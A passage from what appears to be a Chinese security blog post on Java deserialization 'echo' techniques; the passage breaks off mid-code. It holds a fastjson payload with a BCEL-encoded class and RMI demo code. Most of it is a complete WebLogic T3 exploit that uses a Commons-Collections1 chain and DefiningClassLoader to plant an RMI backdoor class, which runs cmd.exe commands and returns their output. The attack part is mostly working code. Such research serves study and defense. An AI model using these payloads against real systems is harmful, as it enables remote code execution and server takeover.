&#125;,</span><br><span class="line">                &quot;driverClassName&quot;: &quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$AuU$5dw$d3F$Q$bdk$cb$5eY$uqb$e7$D$93$94RJ$c1$J$c1$a6$40I$9a$844$q$85$f2$a1$E$g$a7$a1$wM$8b$y$af$j$r$8e$e4$p$cb$3d$fc$p$9ey$b19$f5$a1$7d$ebC$ffI$ffDaVv$9c$bav$fc$b0$ab$99$bd3$9e$7bgV$fa$fb$df$df$ff$Ap$HG$gfp$8fc$8d$e3$h$V$eb$w$eek$88$60C$$$9b$g$be$c5$D$8e$87$w$be$d3$f0$I$8f5$q$f0$84$e3$a9$86$R$Y$i$5b$g$92$b8$t$8dm$f9$f4L$c5s$8e$ef$e5$e3$8e$86$J$UT$ecj$b8$80$l$a4$b1$c7$f1$82$e3G$86$f8$aa$e3$3a$c1$gC4$3b$b7$c7$a0lz$r$c1$904$iWl7$8e$8b$c2$df$b5$8aU$f2$a4$M$cf$b6$aa$7b$96$efH$bb$ebT$82$D$a7$ce$900$CQ$P$96$96$96V$c8$r$5e$L$9ba2k$iZ$bfY$f9$aa$e5V$f2$85$c0w$dc$ca$8a$cc$l$b5$8fK2$d9$c0$nUR$P$7ca$jSl$e7$d4$f1$f2$8f$ddZ$p$u$84n$J$a0$bd$q$7c$86$99a$80$9d$f0$90$60$a3$c5F$b9$y$7cQ$da$e9$c2$cf$f7$e0$h$7d$t2e$H$db$c3$fc$a7$a2$OV2$aa$92$W$M$p$85$c0$b2$8f$b6$acZ$c8$9d$ba$c3aR$_H$7eR$9eA$7b$f0$da$W$b5$c0$f1$5c$SD$5d$b5$ab$5dY$99$e8$R$K$93$f7$60$x$d4$h$K$xx$N$df$W$P$j$v$a7$de$951$t$e1$3af$f1$J$Vv$g$fa$dc$f7lQ$afo4$9cj$c8k$ec$ff$r3p$927G$j$60$88$e4m$99$e1$t$j$_$f13$c7$be$8e_$f0$xC$e6L$e5$a87$95$e2$R$c7$x$j$W$8a2$96$da85$5c9yZ$3a9$j$d0L$87$40YG$F$HD_cH$Pa$af$c3$91$98Y$5c$n$b5$9c$9a$ed$b9e$a7$a2$e3s$5c$d1q$uy$f3$ae$W$7d4$9f$V$P$85$j$9cd$ecgA$e5d_$O$l$baX$3d$b0$fc$40$O$e5$9c1$m$tux$7c$c0IST$RA_$f6$e9$93$e0$81$b9$ec$b4$c8$r$bf$7d$60$f9u$R$e47$3b$3b$b1$u$7b$fe$b6uL$fd$c8$N$bb$Q$c6Y$91$94$f5Vv$e8$df$9d$j$o$99$a6O$83$ba3$$$bd$aa$bc8F8$c5$T$7d$S$9c$de$3d$abV$T$$$b5t$e1$ec2$87$dd$N5$f0NF$_Y$a3$3d$I$_$c9$aeo$d9$C$9f$d1$bbf$G$f2$X$F$93$c3L$ebE$b2$f2$b43$dac$f3$z$b0$b7$f4$Q$c1$a7$b4$c6Cg$i$97h$d5$3b$AJq$99$f6$84$i$LBQ0S$I$R$t$dfa$h$R3$fe$kQ3$9aR$K$a6$92$8a$V$cc$d8$7c$a1$85x$T$bc$J$d5h$pa$5eOi$efp$ae$F$7d$ab$8d$Rs$a1$85$d1$ed6$92f$Lc$cb$K$5b$8e$ddhb$dc$5c$8e$fd$85tF$c9$c4$9aH$a5$d2$b4$bcx$f3$e1$9f6$s$cc$8c$d2$c4d$LS$7f$86$Ed$85$97$a1$d2$9a$a4$K$c7$90$c38$W$91$c2$3a$d2$d8$a4$f7$e9$W$s$b1$8f$e9$b0$fa$b5N$85$f8$CWi$bf$84$t$b8$86$y1$caa$Vs$98$t$s$8b$b8$8d$ebX$a0$bc$ebd$df$a0$T$85$b2$5c$pi$ae$S$eb$9b$U5$8b$c8$Hr$c59$be$e4$b8$c5q$9b$e3$O$c7Wd$C$Z$dc$r$84B$Z$t$a8$a2$c5$9e$b0$fb$5daGS$d3$efp$fe$N$d4$a7$f3Md$dev$b5T$J$dd$e11E$96T5F$3a$ab$90$l$91s$f4$cd$Y$e9$v$9f$a0$dcK$f8$9a$yY$JG$e4$R$c7$b2$fc$bb$95$b0Y$ab$l$B$e8$60$97$T$ac$G$A$A&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;: &quot;bbb&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201218145459924.png" alt="image-20201218145459924"></p>
<p>​        首先我们看一下BasicDataSource这个类是tomcat下的一个类，在tomat-dbcp.jar中，在进行json解析的过程中会调用getConnection()</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201218150110385.png" alt="image-20201218150110385"></p>
<p>​        在createDataSource中调用createConnectionFactory</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201218150145651.png" alt="image-20201218150145651"></p>
<p>​        在createConnectionFactory中调用Class.forName，并将class_name和classloader传入，后面的过程就和之前的demo一样，不再分析了。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201218150304057.png" alt="image-20201218150304057"></p>
<p>​        这种方法目前只能在低版本的fastjson中利用，高版本的fastjson中加入了autoType属性，无法调用BasicDataSource。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201218151232364.png" alt="image-20201218151232364"></p>
<h3 id="RMI回显"><a href="#RMI回显" class="headerlink" title="RMI回显"></a>RMI回显</h3><p>​        首先我们看下如何注册和使用RMI服务，下面是RMI Demo代码</p>
<p>RMIServer.java</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">import java.net.MalformedURLException;</span><br><span class="line">import java.rmi.Naming;</span><br><span class="line">import java.rmi.Remote;</span><br><span class="line">import java.rmi.RemoteException;</span><br><span class="line">import java.rmi.registry.LocateRegistry;</span><br><span class="line">import java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line">public class RMIServer &#123;</span><br><span class="line"></span><br><span class="line">    public interface IRemoteHelloWorld extends Remote &#123;  &#x2F;&#x2F; RMI调用对象接口定义，这个接口必须继承Remote接口，标明这是一个远程调用的接口，接口中定义的方法，会被Client端调用，也就是远程调用方法</span><br><span class="line">        public String hello() throws RemoteException;  &#x2F;&#x2F;远程调用方法必须要抛RemoteException异常</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public class RemoteHelloWorld extends UnicastRemoteObject implements IRemoteHelloWorld &#123;  &#x2F;&#x2F;远程对象实现类</span><br><span class="line">        &#x2F;&#x2F;UnicastRemoteObject用于导出的远程对象和获得与该远程对象通信的存根。</span><br><span class="line"></span><br><span class="line">        protected RemoteHelloWorld() throws RemoteException &#123; &#x2F;&#x2F;实现类需要重写无参构造器，且需要抛出RemoteException异常</span><br><span class="line">            super();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public String hello() &#123;</span><br><span class="line">            return &quot;helloworld&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private void start() throws Exception &#123;</span><br><span class="line"></span><br><span class="line">        RemoteHelloWorld h &#x3D; new RemoteHelloWorld();  &#x2F;&#x2F;创建远程对象</span><br><span class="line">        LocateRegistry.createRegistry(1099);  &#x2F;&#x2F;创建一个接受对1099端口调用的远程对象注册表</span><br><span class="line">        Naming.rebind(&quot;rmi:&#x2F;&#x2F;127.0.0.1:1099&#x2F;Hello&quot;, h); &#x2F;&#x2F;把远程对象注册到RMI注册服务器上，并命名为Hello</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        new RMIServer().start();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>RMIClient.java</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import com.test.rmi.RMIServer;</span><br><span class="line"></span><br><span class="line">import java.rmi.Naming;</span><br><span class="line"></span><br><span class="line">public class RMIClient &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        RMIServer.IRemoteHelloWorld hello &#x3D; (RMIServer.IRemoteHelloWorld)</span><br><span class="line">            Naming.lookup(&quot;rmi:&#x2F;&#x2F;127.0.0.1:1099&#x2F;Hello&quot;);</span><br><span class="line">        String res &#x3D; hello.hello();</span><br><span class="line">        System.out.println(res);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​        首先打开服务端，再打开客户端，最终执行了服务端的hello方法，并将执行结果返回给客户端。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201218170046027.png" alt="image-20201218170046027"></p>
<p>​        因为使用RMI回显利用本质上还是会调用defineClass方法来加载远程类，但是ClassLoader是一个抽象类，不能通过反射来获取抽象类的对象，因此我们如果要利用defineClass方法加载类的字节码，可以尝试寻找ClassLoader的子类,我在weblogic下进行寻找，有不少的类都继承了ClassLoader。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201221094830804.png" alt="image-20201221094830804"></p>
<p>​        在这些类中，有几个类在实现过程中会直接调用父类的defineClass方法，比如weblogic.jar!\jxxload_help\PathVFSJavaLoader.class</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201221101826314.png" alt="image-20201221101826314"></p>
<p>​        还有weblogic.jar!\org\mozilla\classfile\DefiningClassLoader.class</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201221101949975.png" alt="image-20201221101949975"></p>
<p>​        找到了加载类字节码的方式后，我们再看下哪些部分开启了RMI服务，我们之前了解过开启RMI服务需要继承Remote类，因此我们可以寻找继承Remote类的类。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201221102653829.png" alt="image-20201221102653829"></p>
<p>​        由于我们希望通过RMI来进行回显，所以我们要找到的RMI Server端开启的服务需要返回String类型的数据,比如ClusterMasterRemote类的getServerLocation方法。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201221114120045.png" alt="image-20201221114120045"></p>
<p>​        根据这个思路我们可以实现ClusterMasterRemote类并且重写getServerLocation方法，在这个方法中执行命令，并将命令执行的结果返回。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> weblogic.cluster.singleton.ClusterMasterRemote;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RMITest</span> <span class="keyword">implements</span> <span class="title">ClusterMasterRemote</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        RMITest remote = <span class="keyword">new</span> RMITest();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Context context = <span class="keyword">new</span> InitialContext();</span><br><span class="line">            context.rebind(<span class="string">"test666"</span>,remote);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setServerLocation</span><span class="params">(String s, String s1)</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getServerLocation</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> RemoteException </span>&#123;     <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">        List&lt;String&gt; cmds = <span class="keyword">new</span> ArrayList&lt;String&gt;();</span><br><span class="line"></span><br><span class="line">        cmds.add(<span class="string">"cmd.exe"</span>);</span><br><span class="line">        cmds.add(<span class="string">"/c"</span>);</span><br><span class="line">        cmds.add(cmd);</span><br><span class="line"></span><br><span class="line">        ProcessBuilder processBuilder = <span class="keyword">new</span> ProcessBuilder(cmds);</span><br><span class="line">        processBuilder.redirectErrorStream(<span class="keyword">true</span>);</span><br><span class="line">        Process proc = processBuilder.start();</span><br><span class="line"></span><br><span class="line">        BufferedReader br = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(proc.getInputStream()));</span><br><span class="line">        StringBuffer sb = <span class="keyword">new</span> StringBuffer();</span><br><span class="line"></span><br><span class="line">        String line;</span><br><span class="line">        <span class="keyword">while</span> ((line = br.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">            sb.append(line).append(<span class="string">"\n"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> sb.toString();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        <span class="keyword">return</span> e.getMessage();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201221134435820.png" alt="image-20201221134435820"></p>
<p>​        另外我们还需要通过利用链比如common-collection1来通过DefiningClassLoader的defineClass来加载RMITest类并执行类中的main方法绑定一个RMI服务,通过访问这个RMI服务，并传入需要执行的命令，就可以获取命令执行后的结果。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(DefiningClassLoader<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getDeclaredConstructor", new Class[]&#123;Class[].class&#125;, new Object[]&#123;new Class[0]&#125;),</span><br><span class="line">                new InvokerTransformer("newInstance", new Class[]&#123;Object[].class&#125;, new Object[]&#123;new Object[0]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"defineClass"</span>,</span><br><span class="line">                        new Class[]&#123;String.class, byte[].class&#125;, new Object[]&#123;className, clsData&#125;),</span><br><span class="line">                new InvokerTransformer("getMethod", new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;"main", new Class[]&#123;String[].class&#125;&#125;),</span><br><span class="line">                new InvokerTransformer("invoke", new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, new Object[]&#123;null&#125;&#125;),</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(<span class="keyword">new</span> HashSet())&#125;;</span><br></pre></td></tr></table></figure>

<p>​        完整代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xerces.internal.impl.dv.util.Base64;</span><br><span class="line"><span class="keyword">import</span> com.supeream.serial.Reflections;</span><br><span class="line"><span class="keyword">import</span> com.supeream.serial.SerialDataGenerator;</span><br><span class="line"><span class="keyword">import</span> com.supeream.serial.Serializables;</span><br><span class="line"><span class="keyword">import</span> com.supeream.ssl.WeblogicTrustManager;</span><br><span class="line"><span class="keyword">import</span> com.supeream.weblogic.T3ProtocolOperation;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.mozilla.classfile.DefiningClassLoader;</span><br><span class="line"><span class="keyword">import</span> weblogic.cluster.singleton.ClusterMasterRemote;</span><br><span class="line"><span class="keyword">import</span> weblogic.corba.utils.MarshalledObject;</span><br><span class="line"><span class="keyword">import</span> weblogic.jndi.Environment;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String host = <span class="string">"192.168.3.30"</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String port = <span class="string">"7001"</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String classname = <span class="string">"RMITest"</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String url = <span class="string">"t3://"</span> + host + <span class="string">":"</span> + port;</span><br><span class="line">            <span class="keyword">byte</span>[] bs=getBs();</span><br><span class="line">            <span class="comment">// 安装RMI实例</span></span><br><span class="line">            invokeRMI(classname, bs);</span><br><span class="line"></span><br><span class="line">            Environment environment = <span class="keyword">new</span> Environment();</span><br><span class="line">            environment.setProviderUrl(url);</span><br><span class="line">            environment.setEnableServerAffinity(<span class="keyword">false</span>);</span><br><span class="line">            environment.setSSLClientTrustManager(<span class="keyword">new</span> WeblogicTrustManager());</span><br><span class="line">            Context context = environment.getInitialContext();</span><br><span class="line">            ClusterMasterRemote remote = (ClusterMasterRemote) context.lookup(<span class="string">"test666"</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 调用RMI实例执行命令</span></span><br><span class="line">            String res = remote.getServerLocation(<span class="string">"ipconfig"</span>);</span><br><span class="line">            System.out.println(res);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">invokeRMI</span><span class="params">(String className, <span class="keyword">byte</span>[] clsData)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// common-collection1 构造transformers 定义自己的RMI接口</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(DefiningClassLoader<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getDeclaredConstructor", new Class[]&#123;Class[].class&#125;, new Object[]&#123;new Class[0]&#125;),</span><br><span class="line">                new InvokerTransformer("newInstance", new Class[]&#123;Object[].class&#125;, new Object[]&#123;new Object[0]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"defineClass"</span>,</span><br><span class="line">                        new Class[]&#123;String.class, byte[].class&#125;, new Object[]&#123;className, clsData&#125;),</span><br><span class="line">                new InvokerTransformer("getMethod", new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;"main", new Class[]&#123;String[].class&#125;&#125;),</span><br><span class="line">                new InvokerTransformer("invoke", new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, new Object[]&#123;null&#125;&#125;),</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(<span class="keyword">new</span> HashSet())&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        <span class="keyword">final</span> Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> Map lazyMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"></span><br><span class="line">        InvocationHandler handler = (InvocationHandler) Reflections</span><br><span class="line">                .getFirstCtor(</span><br><span class="line">                        <span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>)</span><br><span class="line">                .newInstance(Override<span class="class">.<span class="keyword">class</span>, <span class="title">lazyMap</span>)</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> Map mapProxy = Map<span class="class">.<span class="keyword">class</span></span></span><br><span class="line"><span class="class">                .<span class="title">cast</span>(<span class="title">Proxy</span>.<span class="title">newProxyInstance</span>(<span class="title">SerialDataGenerator</span>.<span class="title">class</span>.<span class="title">getClassLoader</span>(),</span></span><br><span class="line">                        new Class[]&#123;Map.class&#125;, handler));</span><br><span class="line"></span><br><span class="line">        handler = (InvocationHandler) Reflections.getFirstCtor(</span><br><span class="line">                <span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>)</span><br><span class="line">                .newInstance(Override<span class="class">.<span class="keyword">class</span>, <span class="title">mapProxy</span>)</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 序列化数据 MarshalledObject绕过</span></span><br><span class="line">        Object obj = <span class="keyword">new</span> MarshalledObject(handler);</span><br><span class="line">        ByteArrayOutputStream out = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream objOut = <span class="keyword">new</span> ObjectOutputStream(out);</span><br><span class="line">        objOut.writeObject(obj);</span><br><span class="line">        objOut.flush();</span><br><span class="line">        objOut.close();</span><br><span class="line">        <span class="keyword">byte</span>[] payload = out.toByteArray();</span><br><span class="line">        <span class="comment">// t3发送</span></span><br><span class="line">        T3ProtocolOperation.send(host, port, payload);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] getBs() <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        File file=<span class="keyword">new</span> File(<span class="string">"C:\\Users\\admin\\Desktop\\RMITest.class"</span>);</span><br><span class="line">        Long filelength = file.length(); <span class="comment">// 获取文件长度</span></span><br><span class="line">        BufferedInputStream bis = <span class="keyword">null</span>;</span><br><span class="line">        ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        FileInputStream in =<span class="keyword">new</span> FileInputStream(file);</span><br><span class="line">        bis = <span class="keyword">new</span> BufferedInputStream(in);</span><br><span class="line">        <span class="keyword">byte</span>[] buf = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">        <span class="keyword">int</span> len = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> ((len = in.read(buf)) != -<span class="number">1</span>) &#123;</span><br><span class="line">            baos.write(buf, <span class="number">0</span>, len);</span><br><span class="line">        &#125;</span><br><span class="line">        <span 